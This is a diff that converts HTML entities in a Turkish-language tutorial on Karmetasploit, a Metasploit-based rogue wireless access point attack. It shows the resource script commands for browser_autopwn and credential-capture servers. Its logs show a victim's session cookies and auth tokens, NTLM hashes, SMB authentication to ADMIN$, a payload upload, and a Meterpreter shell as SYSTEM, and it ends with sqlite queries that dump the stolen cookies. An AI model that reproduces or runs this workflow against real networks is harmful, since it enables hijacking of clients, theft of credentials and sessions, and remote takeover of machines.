@@ -45,7 +45,7 @@ Connecting to <a href="http://www.offensive-security.com/">www.offensive-securit
 HTTP request sent, awaiting response... 200 OK
 Length: 1089 **(**1.1K**)** **[**text/plain]
 
-Saving to: `karma.rc' 100%[======================================&gt;] 1,089 --.-K/s in 0s
+Saving to: `karma.rc' 100%[======================================>] 1,089 --.-K/s in 0s
 
 2015-04-03 16:17:28 (35.9 MB/s) - `karma.rc' saved **[**1089/1089]
 root@kali:~#
@@ -244,47 +244,47 @@ root@kali:~#
 root@kali:~# msfconsole -q -r karma.rc_.txt
 
 **[*********]** Processing karma.rc_.txt **for **ERB directives.
-resource **(**karma.rc_.txt**)&gt;** db_connect postgres:toor@127.0.0.1/msfbook
-resource **(**karma.rc_.txt**)&gt;** use auxiliary/server/browser_autopwn
-resource **(**karma.rc_.txt**)&gt;** setg AUTOPWN_HOST 10.0.0.1
-AUTOPWN_HOST **=&gt;** 10.0.0.1
-resource **(**karma.rc_.txt**)&gt;** setg AUTOPWN_PORT 55550
-AUTOPWN_PORT **=&gt;** 55550
-resource **(**karma.rc_.txt**)&gt;** setg AUTOPWN_URI /ads
-AUTOPWN_URI **=&gt;** /ads
-resource **(**karma.rc_.txt**)&gt;** set LHOST 10.0.0.1
-LHOST **=&gt;** 10.0.0.1
-resource **(**karma.rc_.txt**)&gt;** set LPORT 45000
-LPORT **=&gt;** 45000
-resource **(**karma.rc_.txt**)&gt;** set SRVPORT 55550
-SRVPORT **=&gt;** 55550
-resource **(**karma.rc_.txt**)&gt;** set URIPATH /ads
-URIPATH **=&gt;** /ads
-resource **(**karma.rc_.txt**)&gt;** run
+resource **(**karma.rc_.txt**)>** db_connect postgres:toor@127.0.0.1/msfbook
+resource **(**karma.rc_.txt**)>** use auxiliary/server/browser_autopwn
+resource **(**karma.rc_.txt**)>** setg AUTOPWN_HOST 10.0.0.1
+AUTOPWN_HOST **=>** 10.0.0.1
+resource **(**karma.rc_.txt**)>** setg AUTOPWN_PORT 55550
+AUTOPWN_PORT **=>** 55550
+resource **(**karma.rc_.txt**)>** setg AUTOPWN_URI /ads
+AUTOPWN_URI **=>** /ads
+resource **(**karma.rc_.txt**)>** set LHOST 10.0.0.1
+LHOST **=>** 10.0.0.1
+resource **(**karma.rc_.txt**)>** set LPORT 45000
+LPORT **=>** 45000
+resource **(**karma.rc_.txt**)>** set SRVPORT 55550
+SRVPORT **=>** 55550
+resource **(**karma.rc_.txt**)>** set URIPATH /ads
+URIPATH **=>** /ads
+resource **(**karma.rc_.txt**)>** run
 **[*********]** Auxiliary module execution completed
-resource **(**karma.rc_.txt**)&gt;** use auxiliary/server/capture/pop3
-resource **(**karma.rc_.txt**)&gt;** set SRVPORT 110
-SRVPORT **=&gt;** 110
-resource **(**karma.rc_.txt**)&gt;** set SSL false
-SSL **=&gt;** false
-resource **(**karma.rc_.txt**)&gt;** run
+resource **(**karma.rc_.txt**)>** use auxiliary/server/capture/pop3
+resource **(**karma.rc_.txt**)>** set SRVPORT 110
+SRVPORT **=>** 110
+resource **(**karma.rc_.txt**)>** set SSL false
+SSL **=>** false
+resource **(**karma.rc_.txt**)>** run
 **[*********]** Auxiliary module execution completed
-resource **(**karma.rc_.txt**)&gt;** use auxiliary/server/capture/pop3
-resource **(**karma.rc_.txt**)&gt;** set SRVPORT 995
-SRVPORT **=&gt;** 995
-resource **(**karma.rc_.txt**)&gt;** set SSL true
-SSL **=&gt;** true
-resource **(**karma.rc_.txt**)&gt;** run
+resource **(**karma.rc_.txt**)>** use auxiliary/server/capture/pop3
+resource **(**karma.rc_.txt**)>** set SRVPORT 995
+SRVPORT **=>** 995
+resource **(**karma.rc_.txt**)>** set SSL true
+SSL **=>** true
+resource **(**karma.rc_.txt**)>** run
 **[*********]** Auxiliary module execution completed
-resource **(**karma.rc_.txt**)&gt;** use auxiliary/server/capture/ftp
+resource **(**karma.rc_.txt**)>** use auxiliary/server/capture/ftp
 **[*********]** Setup
-resource **(**karma.rc_.txt**)&gt;** run
+resource **(**karma.rc_.txt**)>** run
 **[*********]** Listening on 0.0.0.0:110...
 **[*********]** Auxiliary module execution completed
 **[*********]** Server started.
 
 
-msf auxiliary**(**http**)** **&gt;**
+msf auxiliary**(**http**)** **>**
 ```
 
 
@@ -297,10 +297,10 @@ Kayıt edilen paketlere bakalım.
 
 
 ```bash
-msf auxiliary**(**http**)** **&gt;**
+msf auxiliary**(**http**)** **>**
 **[*********]** DNS 10.0.0.100:1276 XID 87 **(**IN::A <a href="http://www.msn.com/">www.msn.com</a>**)**
 **[*********]** DNS 10.0.0.100:1276 XID 87 **(**IN::A <a href="http://www.msn.com/">www.msn.com</a>**)**
-**[*********]** HTTP REQUEST 10.0.0.100 **&gt;** <a href="http://www.msn.com/">www.msn.com:80</a> GET / Windows IE 5.01 cookies**=**MC1**=**V**=**3&amp;GUID**=**e2eabc69be554e3587acce84901a53d3; MUID**=**E7E065776DBC40099851B16A38DB8275; mh**=**MSFT; CULTURE**=**EN-US; zip**=**z:68101|la:41.26|lo:-96.013|c:US|hr:1; FlightGroupId**=**14; FlightId**=**BasePage; hpsvr**=**M:5|F:5|T:5|E:5|D:blu|W:F; hpcli**=**W.H|L.|S.|R.|U.L|C.|H.; ushpwea**=**wc:USNE0363; wpv**=**2
+**[*********]** HTTP REQUEST 10.0.0.100 **>** <a href="http://www.msn.com/">www.msn.com:80</a> GET / Windows IE 5.01 cookies**=**MC1**=**V**=**3&amp;GUID**=**e2eabc69be554e3587acce84901a53d3; MUID**=**E7E065776DBC40099851B16A38DB8275; mh**=**MSFT; CULTURE**=**EN-US; zip**=**z:68101|la:41.26|lo:-96.013|c:US|hr:1; FlightGroupId**=**14; FlightId**=**BasePage; hpsvr**=**M:5|F:5|T:5|E:5|D:blu|W:F; hpcli**=**W.H|L.|S.|R.|U.L|C.|H.; ushpwea**=**wc:USNE0363; wpv**=**2
 **[*********]** DNS 10.0.0.100:1279 XID 88 **(**IN::A <a href="http://adwords.google.com/">adwords.google.com</a>**)**
 **[*********]** DNS 10.0.0.100:1279 XID 88 **(**IN::A <a href="http://adwords.google.com/">adwords.google.com</a>**)**
 **[*********]** DNS 10.0.0.100:1280 XID 89 **(**IN::A <a href="http://blogger.com/">blogger.com</a>**)**
@@ -321,44 +321,44 @@ msf auxiliary**(**http**)** **&gt;**
 **[*********]** DNS 10.0.0.100:1293 XID 97 **(**IN::A <a href="http://google.com/">google.com</a>**)**
 **[*********]** Error: SQLite3::SQLException cannot start a transaction within a transaction /usr/lib/ruby/1.8/sqlite3/errors.rb:62:in `check'/usr/lib/ruby/1.8/sqlite3/resultset.rb:47:in `check'/usr/lib/ruby/1.8/sqlite3/resultset.rb:39:in `commence'/usr/lib/ruby/1.8/sqlite3
 ...snip...
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://ecademy.com/">ecademy.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://facebook.com/">facebook.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://gather.com/">gather.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://gmail.com/">gmail.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://gmail.google.com/">gmail.google.com</a>:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880:S=snePRUjY-zgcXpEV; NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6hI1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://google.com/">google.com</a>:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880:S=snePRUjY-zgcXpEV; NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6hI1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://linkedin.com/">linkedin.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://livejournal.com/">livejournal.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://monster.com/">monster.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://myspace.com/">myspace.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://plaxo.com/">plaxo.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://ryze.com/">ryze.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://ecademy.com/">ecademy.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://facebook.com/">facebook.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://gather.com/">gather.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://gmail.com/">gmail.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://gmail.google.com/">gmail.google.com</a>:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880:S=snePRUjY-zgcXpEV; NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6hI1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://google.com/">google.com</a>:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880:S=snePRUjY-zgcXpEV; NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6hI1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://linkedin.com/">linkedin.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://livejournal.com/">livejournal.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://monster.com/">monster.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://myspace.com/">myspace.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://plaxo.com/">plaxo.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://ryze.com/">ryze.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
 [*] Sending MS03-020 Internet Explorer Object Type to 10.0.0.100:1278...
-[*] HTTP REQUEST 10.0.0.100 &gt; slashdot.org:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > slashdot.org:80 GET /forms.html Windows IE 5.01 cookies=
 [*] Received 10.0.0.100:1360 LMHASH:00 NTHASH: OS:Windows 2000 2195 LM:Windows 2000 5.0
 ...snip...
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.monster.com/">www.monster.com:80</a> GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://www.monster.com/">www.monster.com:80</a> GET /forms.html Windows IE 5.01 cookies=
 [*] Received 10.0.0.100:1362 TARGET\P0WN3D LMHASH:47a8cfba21d8473f9cc1674cedeba0fa6dc1c2a4dd904b72 NTHASH:ea389b305cd095d32124597122324fc470ae8d9205bdfc19 OS:Windows 2000 2195 LM:Windows 2000 5.0
 [*] Authenticating to 10.0.0.100 as TARGET\P0WN3D...
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.myspace.com/">www.myspace.com:80</a> GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://www.myspace.com/">www.myspace.com:80</a> GET /forms.html Windows IE 5.01 cookies=
 [*] AUTHENTICATED as TARGETP0WN3D...
 [*] Connecting to the ADMIN$ share...
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.plaxo.com/">www.plaxo.com:80</a> GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://www.plaxo.com/">www.plaxo.com:80</a> GET /forms.html Windows IE 5.01 cookies=
 [*] Regenerating the payload...
 [*] Uploading payload...
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.ryze.com/">www.ryze.com:80</a> GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.slashdot.org/">www.slashdot.org:80</a> GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.twitter.com/">www.twitter.com:80</a> GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.xing.com/">www.xing.com:80</a> GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.yahoo.com/">www.yahoo.com:80</a> GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://xing.com/">xing.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://yahoo.com/">yahoo.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://www.ryze.com/">www.ryze.com:80</a> GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://www.slashdot.org/">www.slashdot.org:80</a> GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://www.twitter.com/">www.twitter.com:80</a> GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://www.xing.com/">www.xing.com:80</a> GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://www.yahoo.com/">www.yahoo.com:80</a> GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://xing.com/">xing.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://yahoo.com/">yahoo.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
 [*] Created UxsjordQ.exe...
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://ziggs.com/">ziggs.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://ziggs.com/">ziggs.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
 [*] Connecting to the Service Control Manager...
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://care.com/">care.com</a>:80 GET / Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.gather.com/">www.gather.com:80</a> GET /forms.html Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.ziggs.com/">www.ziggs.com:80</a> GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://care.com/">care.com</a>:80 GET / Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://www.gather.com/">www.gather.com:80</a> GET /forms.html Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://www.ziggs.com/">www.ziggs.com:80</a> GET /forms.html Windows IE 5.01 cookies=
 [*] Obtaining a service manager handle...
 [*] Creating a new service...
 [*] Closing service handle...
@@ -379,25 +379,25 @@ msf auxiliary**(**http**)** **&gt;**
 [*] Sending Apple QuickTime 7.1.3 RTSP URI Buffer Overflow to 10.0.0.100:1278...
 [*] Sending stage (2650 bytes)
 [*] Sending iPhone MobileSafari LibTIFF Buffer Overflow to 10.0.0.100:1367...
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.care2.com/">www.care2.com:80</a> GET / Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://www.care2.com/">www.care2.com:80</a> GET / Windows IE 5.01 cookies=
 [*] Sleeping before handling stage...
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.yahoo.com/">www.yahoo.com:80</a> GET / Windows IE 5.01 cookies=
-[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://yahoo.com/">yahoo.com</a>:80 GET / Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://www.yahoo.com/">www.yahoo.com:80</a> GET / Windows IE 5.01 cookies=
+[*] HTTP REQUEST 10.0.0.100 > <a href="http://yahoo.com/">yahoo.com</a>:80 GET / Windows IE 5.01 cookies=
 [*] Uploading DLL (75787 bytes)...
 [*] Upload completed.
 [*] Migrating to lsass.exe...
 [*] Current server process: rundll32.exe (848)
 [*] New server process: lsass.exe (232)
-[*] Meterpreter session 1 opened (10.0.0.1:45017 -&gt; 10.0.0.100:1364)
+[*] Meterpreter session 1 opened (10.0.0.1:45017 -> 10.0.0.100:1364)
 
-msf auxiliary(http) &gt; sessions -l
+msf auxiliary(http) > sessions -l
 
 Active sessions
 ===============
 
   Id  Description  Tunnel                             
   --  -----------  ------                             
-  1   Meterpreter  10.0.0.1:45017 -&gt; 10.0.0.100:1364
+  1   Meterpreter  10.0.0.1:45017 -> 10.0.0.100:1364
 ```
 
 
@@ -419,10 +419,10 @@ Bu kısımda, kullanıcının bağlanmak istediği adreslere dair DNS Lookup iş
 
 
 ```bash
-**[*********]** HTTP REQUEST 10.0.0.100 **&gt;** <a href="http://gmail.google.com/">gmail.google.com</a>:80 GET /forms.html Windows IE 5.01 cook
+**[*********]** HTTP REQUEST 10.0.0.100 **>** <a href="http://gmail.google.com/">gmail.google.com</a>:80 GET /forms.html Windows IE 5.01 cook
 ies**=**PREF**=**ID**=**474686c582f13be6:U**=**ecaec12d78faa1ba:TM**=**1241334857:LM**=**1241334880: S**=**snePRUjY-zgcXpEV;NID**=**22**=**nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6h I1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
 
-**[*********]** HTTP REQUEST 10.0.0.100 **&gt;** <a href="http://google.com/">google.com</a>:80 GET /forms.html Windows IE 5.01 cookies**=**PREF**=**ID**=**474686c582f13be6:U**=**ecaec12d78faa1ba:TM**=**1241334857:LM**=**1241334880: S**=**snePRUjY-zgcXpEV;NID**=**22**=**nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4e FCH6hI1ae23g hwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
+**[*********]** HTTP REQUEST 10.0.0.100 **>** <a href="http://google.com/">google.com</a>:80 GET /forms.html Windows IE 5.01 cookies**=**PREF**=**ID**=**474686c582f13be6:U**=**ecaec12d78faa1ba:TM**=**1241334857:LM**=**1241334880: S**=**snePRUjY-zgcXpEV;NID**=**22**=**nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4e FCH6hI1ae23g hwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
 Here we can see Karmetasploit collecting cookie information from the client. This could be useful information to use **in **attacks against the user later on.
 
 **[*********]** Received 10.0.0.100:1362 TARGET\P0WN3D LMHASH:47a8cfba21d8473f9cc1674cedeba0fa6dc1c2a4dd904b72 NTHASH:ea389b305cd095d32124597122324fc470ae8d9205bdfc19 OS:Windows 2000 2195 LM:Windows 2000 5.0
@@ -451,16 +451,16 @@ Here we can see Karmetasploit collecting cookie information from the client. Thi
 **[*********]** Sending Apple QuickTime 7.1.3 RTSP URI Buffer Overflow to 10.0.0.100:1278...
 **[*********]** Sending stage **(**2650 bytes**)**
 **[*********]** Sending iPhone MobileSafari LibTIFF Buffer Overflow to 10.0.0.100:1367...
-**[*********]** HTTP REQUEST 10.0.0.100 **&gt;** <a href="http://www.care2.com/">www.care2.com:80</a> GET / Windows IE 5.01 cookies**=**
+**[*********]** HTTP REQUEST 10.0.0.100 **>** <a href="http://www.care2.com/">www.care2.com:80</a> GET / Windows IE 5.01 cookies**=**
 **[*********]** Sleeping before handling stage...
-**[*********]** HTTP REQUEST 10.0.0.100 **&gt;** <a href="http://www.yahoo.com/">www.yahoo.com:80</a> GET / Windows IE 5.01 cookies**=**
-**[*********]** HTTP REQUEST 10.0.0.100 **&gt;** <a href="http://yahoo.com/">yahoo.com</a>:80 GET / Windows IE 5.01 cookies**=**
+**[*********]** HTTP REQUEST 10.0.0.100 **>** <a href="http://www.yahoo.com/">www.yahoo.com:80</a> GET / Windows IE 5.01 cookies**=**
+**[*********]** HTTP REQUEST 10.0.0.100 **>** <a href="http://yahoo.com/">yahoo.com</a>:80 GET / Windows IE 5.01 cookies**=**
 **[*********]** Uploading DLL **(**75787 bytes**)**...
 **[*********]** Upload completed.
 **[*********]** Migrating to lsass.exe...
 **[*********]** Current server process: rundll32.exe **(**848**)**
 **[*********]** New server process: lsass.exe **(**232**)**
-**[*********]** Meterpreter session 1 opened **(**10.0.0.1:45017 -&gt; 10.0.0.100:1364**)**
+**[*********]** Meterpreter session 1 opened **(**10.0.0.1:45017 -> 10.0.0.100:1364**)**
 ```
 
 
@@ -473,10 +473,10 @@ Açılan Meterpreter oturumunda neler yapılabileceğine bakalım.
 
 
 ```bash
-msf auxiliary**(**http**)** **&gt;** sessions -i 1
+msf auxiliary**(**http**)** **>** sessions -i 1
 **[*********]** Starting interaction with 1...
 
-meterpreter **&gt;** ps
+meterpreter **>** ps
 
 Process list
 **============**
@@ -507,7 +507,7 @@ Process list
     952   SCardSvr.exe       C:\WINNT\System32\SCardSvr.exe                                
     1168  IEXPLORE.EXE       C:\Program Files\Internet Explorer\IEXPLORE.EXE               
 
-meterpreter **&gt;** ipconfig /all
+meterpreter **>** ipconfig /all
 
 VMware Accelerated AMD PCNet Adapter
 Hardware MAC: 00:0c:29:85:81:55
@@ -529,9 +529,9 @@ IP Address  : 127.0.0.1
 Netmask     : 255.0.0.0
 
 
-meterpreter **&gt;** pwd
+meterpreter **>** pwd
 C:\WINNT\system32
-meterpreter **&gt;** getuid
+meterpreter **>** getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
@@ -548,7 +548,7 @@ Veri tabanı Ev klasöründe oluşturulmuştu. Aşağıdaki komut ile veri taban
 root@kali:~# sqlite3 karma.db
 SQLite version 3.5.9
 Enter ".help" **for **instructions
-sqlite&gt; .schema
+sqlite> .schema
 CREATE TABLE hosts **(**
 'id' INTEGER PRIMARY KEY NOT NULL,
 'created' TIMESTAMP,
@@ -637,9 +637,9 @@ Veri tabanı şemasından faydalanarak bilgileri kontrol edelim.
 
 
 ```bash
-sqlite&gt; **select** ***** from hosts;
+sqlite> **select** ***** from hosts;
 1|2009-05-09 23:47:04|10.0.0.100|||alive||Windows|2000|||x86
-sqlite&gt; **select** ***** from notes where host_id **=** 1;
+sqlite> **select** ***** from notes where host_id **=** 1;
 1|2009-05-09 23:47:04|1|http_cookies|en-us.start2.mozilla.com __utma**=**183859642.1221819733.1241334886.1241334886.1241334886.1; __utmz**=**183859642.1241334886.1.1.utmccn**=(**organic**)**|utmcsr**=**google|utmctr**=**firefox|utmcmd**=**organic
 2|2009-05-09 23:47:04|1|http_request|en-us.start2.mozilla.com:80 GET /firefox Windows FF 1.9.0.10
 3|2009-05-09 23:47:05|1|http_cookies|adwords.google.com PREF**=**ID**=**ee60297d21c2a6e5:U**=**ecaec12d78faa1ba:TM**=**1241913986:LM**=**1241926890:GM**=**1:S**=**-p5nGxSz_oh1inss; NID**=**22**=**Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID**=**DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
@@ -663,7 +663,7 @@ sqlite&gt; **select** ***** from notes where host_id **=** 1;
 102|2009-05-09 23:50:03|1|http_request|safebrowsing.clients.google.com:80 POST /safebrowsing/downloads Windows FF 1.9.0.10
 108|2009-05-10 00:43:29|1|http_cookies|twitter.com auth_token**=**1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
 109|2009-05-10 00:43:29|1|http_cookies|www.twitter.com auth_token**=**1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
-sqlite&gt;
+sqlite>
 ```
 
 
